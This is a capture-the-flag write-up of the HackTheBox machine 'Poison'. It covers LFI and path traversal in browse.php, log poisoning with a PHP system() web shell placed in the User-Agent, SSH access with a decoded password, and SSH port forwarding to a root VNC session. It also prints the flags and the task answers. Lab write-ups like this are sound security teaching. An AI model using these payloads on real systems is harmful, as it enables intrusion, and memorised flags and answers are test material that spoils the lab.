
# 🚩 Poison - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/1-banner.png)

## General Informations
| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | 🟠 Medium |
| **OS** | 😈 FreeBSD |
| **Mode** | 🧭 Guided Mode |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: LFI & Log Poisoning](#-2-lfi--log-poisoning) <br> [3: Initial Foothold (charix)](#-3-initial-foothold-charix) <br> [4: Privilege Escalation (root)](#-4-privilege-escalation-root) <br> [5: Pwn3d !!](#-5-pwn3d-) |
| **Date** | 2026-05-21 |

---

## Executive Summary
*Hello everyone!! This is Reef the Inquirer✨. Armed with patience and fueled by curiosity, I dove into the FreeBSD-based os challenge for the first time. This machine was a beautiful lesson in network poisoning.*

*A classic Path Traversal and Local File Inclusion (LFI) vulnerabilities in the web page that allowed me to explore the FreeBSD file system and uncover the Apache log paths. I weaponized this LFI to perform a Log Poisoning attack, for Remote Code Execution as the www user. In parallel, discovering a deeply encoded backup file led me to a CyberChef decoding marathon, ultimately revealing the SSH password for the user charix. The final strike involved transferring a locked zip file, unzipping a VNC authentication token locally, and executing a SSH Local Port Forwarding technique to access an internal VNC service and claim the ROOT graphical desktop! 🚩*

---

## Tools Used
`Your mind and eyes!!`, `Nmap`, `dirbuster`, `DevTools`, `ssh`, `python`, `unzip`, `netstat`, `vncviewer`

---

## 🔍 1: Reconnaissance & Enumeration

Attacker = 10.10.17.105

Target = 10.129.1.254

### 1.1 Port Scanning

According to the first task, I choose to scan all TCP ports using the option `-pT:1-65535`

```BASH
sudo nmap -sS -A -v -pT:1-65535 -T4 10.129.1.254
```
🧐 Findings:

```
Discovered open port 80/tcp on 10.129.1.254
Discovered open port 22/tcp on 10.129.1.254
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey:
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
Aggressive OS guesses: FreeBSD 11.0-RELEASE - 12.0-CURRENT (97%)
```


<details>
  <summary>🟢 Task 1: How many TCP ports are accessible on Poison?</summary>
  <br>
  2
</details>

### 1.2 Directory & File Discovery
```BASH
feroxbuster -u http://10.129.1.254 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common_directories.txt
```
🧐 Findings:

```Bash
200      GET       4l       30w      321c http://10.129.1.254/browse.php
200      GET      12l       30w      289c http://10.129.1.254/
[####################] - 2s        12/12      0s      found:2      errors:0
```

***Cool, let's see both of them:***


`/` > Web page for testing local PHP scripts.

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/2-web-page.png)
It also reveals some interesting PHP files we should test them:
  * ini.php > Nothing interesting.
  * info.php > Nothing interesting.
  * phpinfo.php > Useful to see.
  * listfiles.php > THIS IS IT !!

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/3-listfiles.png)
We noticed 2 new things.. the first is that the `/` page is sending the script file `listfiles.php` as variable `file=` to the `/browse.php` (which was previously discovered in the Feroxbuster tool) path in the URL. 

<details>
  <summary>🟢 Task 2: What is the relative path of a PHP script that seems to include other files?</summary>
  <br>
  /browse.php
</details>

The second thing we see new files
  * pwdbackup.txt > Interesting TXT file.. we'll use it later.
  * . and .. > looks like Path Traversal vuln that we'll test.


### 1.3 Local File Inclusion (LFI) Discovery

I tested the `browse.php?file=` parameter for Local File Inclusion (LFI). By injecting a simple dot `.` (that's mean current directory), the server threw a PHP warning, revealing the exact path of the web root on this FreeBSD system which is:
`/usr/local/www/apache24/data/browse.php`

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/6-current-dir.png)
With the path traversal confirmed, I navigated back through the directories and easily read the master password file to enumerate users:
```URL
http://10.129.1.254/browse.php?file=../../../../../etc/passwd
```

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/7-path-traversel.png)

🧐 Findings: 

This revealed the existence of a specific local user named `charix`.


---

## 💉 2: LFI & Log Poisoning

We know that by default Apache access log path on FreeBSD, is typically located at `/var/log/httpd-access.log` which recording every access attempt . So, we can **poisoning** it to upgrade the *LFI* into *Remote Code Execution (RCE)*.

### 2.1 Poisoning the Access Log
So let's intercept the web request using the BurpSuite or browser's DevTools (Network tab) and modified the **User-Agent** header to contain a raw PHP system command:

```PHP
<?php system($_GET['cmd']); ?>
```
![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/10-poisoning.png)
When this request was sent, the Apache server logged my malicious User-Agent directly into the `httpd-access.log`👾

### 2.2 Triggering the RCE
Now, we can navigate to the log file via the LFI vulnerability, passing the `cmd` parameter with any command we want to execute (in my example is `whoami`) in the URL:

```URL
http://10.129.1.254/browse.php?file=/var/log/httpd-access.log&cmd=whoami
```
Scrolling to the very bottom of the massive log output,our PHP code executed and returned the result:
`www` !! 😈

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/11-cmd-whoami.png)

According to this successful and amazing exploiting, we can run arbitrary shell commands or create reverse shell with this `www` user privileges.. then we should upgrade our `www` into `charix` user.


But, I needed a more stable foothold with `charix` user privileges directly. 
So, I jumped into `charix` as will be shown🚀

<details>
  <summary>🟢 Task 3: What is the full path to the Apache access logs on Poison?</summary>
  <br>
  /var/log/httpd-access.log
</details>


<details>
  <summary>🟢 Task 4: What user is the webserver running as?</summary>
  <br>
  www
</details>


---

## 🚪 3: Initial Foothold (charix)

Current User: www

Target User: charix

Early, we discoverd `pwdbackup.txt` file provided by the site. Let's check it !

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/4-pwdbackup.png)
Hmmmmm easy.. 13 time base64 decoding in [CyberChef](https://gchq.github.io/CyberChef/)

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/5-13decode.png)
Great!! we have a password for  the discovered `charix` user, so we got these creds:
```Note
charix : Charix!2#4%6&8(0
```

Now, let's initiate an SSH stable connection to the target:

```Bash
ssh charix@10.129.1.254
```
![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/8-ssh-conn.png)
![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/9-user-flag.png)

Here we go! 🚀 I'm charix user and got the flag, lets continue


<details>
  <summary>🟢 Task 5: What is the password stored in `pwdbackup.txt?`</summary>
  <br>
  Charix!2#4%6&8(0
</details>


<details>
  <summary>🟢 Task 6: What user uses the password from pwdbackup.txt as their password on Poison?</summary>
  <br>
  charix
</details>


---

## 👑 4: Privilege Escalation (root)

Current User: charix

Target User: root

As seen above, listing the files in charix's home directory `ls -al`, I found a file named `secret.zip` owned by root.

Since the FreeBSD version of `unzip` was being stubborn with password inline parameters, I decided to exfiltrate the file to my Kali machine💀

On the Poison machine, I started a simple Python web server after knowing the Python version:
```Shell
charix@Poison:~ % python -m SimpleHTTPServer 8888
```
![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/12-simple-server.png)

Now, on my Kali browser, let's navigate to `http://10.129.1.254:8888`, click on `secret.zip`, and downloaded it directly.


![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/13-simple-client.png)

Then unzipped the file using the password we cracked earlier `Charix!2#4%6&8(0`(knows that by guessing☕..):

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/14-unzip.png)


<details>
  <summary>🟢 Task 8: What is the password used to decrypt secret.zip in the charix user's home directory?</summary>
  <br>
  Charix!2#4%6&8(0
</details>


This extracted a file simply named `secret`, which contained non-printable binary characters, which is a hallmark of a **VNC authentication token.**

Soooo, let's confirmed it's existent by running `netstat -an` on the FreeBSD machine revealed an interesting local service:

![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/15-netstat.png)

Port **5901** is the default port for VNC (Display :1). Because it was only listening locally (127.0.0.1), we couldn't connect to it directly from our Kali. We need to established an **SSH Local Port Forwarding** tunnel.

From our Kali terminal:
```Shell
ssh -L 5901:127.0.0.1:5901 charix@10.129.1.254
```
  * `ssh -L`: Enables Local Port Forwarding to establish a secure connection tunnel.
  * `5901` (first): The local port that will be opened on our Kali machine to await the connection.
  * `127.0.0.1`: The internal destination address from the victim's perspective (the target machine's localhost).
  * `5901` (second): The hidden port on the victim's machine used by the VNC service.
  * `charix@10.129.1.254`: The username and IP used to establish the SSH tunnel.


![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/16-local-port-forwarding.png)

Now, with the tunnel open and the `secret` token in hand, open a new terminal tab , and launch the `vncviewer`: 
```Shell
vncviewer -passwd secret 127.0.0.1::5901
```
  * `127.0.0.1::5901`: Both 127.0.0.1 and port 5901 belong to our Kali device (the use of the double colon `::` is a custom format in this tool to prevent interference and clearly separate the IP address from the port).


![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/17-vncviewer.png)


FINALLY !! The connection authenticated flawlessly, and a TightVNC window popped up, dropping us directly into the **root** graphical desktop!!💥


<details>
  <summary>🟢 Task 9: Which service uses port 5901 as its default port? Given the answer in it's non-abbreviated form.</summary>
  <br>
  Virtual Network Computing
</details>

<details>
  <summary>🟢 Task 10: Which option is used by `vncviewer` to provide a file as authentication?</summary>
  <br>
  -passwd
</details>

---

## 🏁 5: Pwn3d !!


**🚩 User Flag: eaacdfb2d141b72a589233063604209c**

**🚩 Root Flag: 716d04b188419cf2bb99d891272361f5**

We should always enforce strict input whitelisting to prevent Path Traversal and Local File Inclusion (LFI), restrict read access on system logs to thwart Log Poisoning, replace easily decoded Base64 strings with strong cryptographic hashing, and disable unnecessary SSH TCP forwarding to prevent lateral movement to internal services like VNC.


![](https://github.com/referefz/HTB-Writeups/blob/main/images/Poison/18-pwn3d!.png)


Created with 💜 by **The Inquirer, Reef**
